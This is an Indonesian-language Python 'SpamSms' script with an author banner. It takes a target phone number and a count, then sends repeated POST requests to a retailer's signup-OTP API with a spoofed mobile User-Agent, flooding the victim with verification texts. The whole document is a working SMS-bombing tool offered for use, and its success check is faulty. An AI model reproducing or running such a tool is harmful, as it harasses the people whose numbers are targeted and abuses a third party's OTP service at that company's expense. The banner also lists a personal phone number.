import json
import requests
import os
import sys

def main():
	os.system('clear')
	os.system('figlet SpamSms')
	banner ='''
#################################
AUTHOR : Mr.Jeeck
GITHUB : Jeeck007
WHATSAPP : 081392505882
FACEBOOK : Jecko X Ganz
#################################
'''

	print(banner)
	no = input('target : ')
	jum = input('Jumlah spam : ')

	head = {
	"User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36",
	"Referer": "https://www.mapclub.com/en/user/signup",
	"Host": "cmsapi.mapclub.com",
	}


	dat = {
	'phone': no
	}

	for x in range(int(jum)):
		leosureo = requests.post("https://cmsapi.mapclub.com/api/signup-otp", headers=head, json=dat)
		if 'error' in leosureo:
			print('Gagal Mengirim '+ no)
		else:
			print('success mengirim '+ no)
main()
